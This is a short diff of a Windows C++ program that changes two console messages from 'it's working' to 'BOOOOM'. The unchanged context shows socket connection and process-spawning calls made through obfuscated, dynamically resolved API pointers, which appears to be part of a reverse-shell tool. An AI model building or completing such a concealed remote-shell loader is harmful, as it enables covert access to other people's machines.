@@ -99,7 +99,7 @@ int main(int argc, char* argv[]) {
     if (reinterpret_cast<int(WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF,
         LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>(
         Connectsaw)(wSock, reinterpret_cast<const sockaddr*>(&hax), sizeof(hax), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == 0) {
-        printf("\nit 's working\n"); // Connection successful
+        printf("\n BOOOOOOM \n"); // Connection successful
     }
     else {
         printf("Error: 0x%x\n", GetLastError()); // Print error code
@@ -127,7 +127,7 @@ int main(int argc, char* argv[]) {
         // Wait for the process to finish
         reinterpret_cast<DWORD(WINAPI*)(HANDLE, DWORD)>(waitForSingleObject)(pi.hProcess, INFINITE);
         FreeConsole(); // Free the console
-        printf("it is working !!!"); // Successful execution
+        printf("BOOOOM !!!"); // Successful execution
     }
 
     return 0; // End of program
